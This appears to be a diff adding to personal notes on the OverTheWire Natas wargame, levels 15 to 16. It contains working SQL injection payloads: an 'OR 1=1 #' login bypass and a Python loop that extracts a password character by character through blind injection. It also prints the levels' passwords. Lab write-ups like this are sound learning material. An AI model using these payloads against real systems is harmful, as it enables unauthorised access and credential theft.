@@ -228,3 +228,23 @@ response = session.post(url, data = {"username": 'please" OR 1=1 #', "password":
 // the pound # makes the reste of the query unmarked 
 //  OR 1=1 means OR everything returns true 
 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div
+
+lvl 15 --> lvl 16
+http://natas15.natas.labs.overthewire.org/
+natas15
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+// The point of this level is to process a BLIND SQL injection
+// After having guessed that the useranme was natas16, we had to look for the password
+Take a look at our SQL query
+response = session.post(url, data={
+                        "username": 'natas16" AND password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username, password))
+// 
+// We had to create a loop, to loop for our list of characters (a,b,c,d...,0,1,2,...A,B,C,D,...)
+// Adding BINARY will make our request case sensitive
+response = session.post(url, data={
+                        "username": 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username, password))
+// We added the following code to our loop to append each new character to our result
+if ('user exists' in content):
+            seen_password.append(ch)
+            break
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
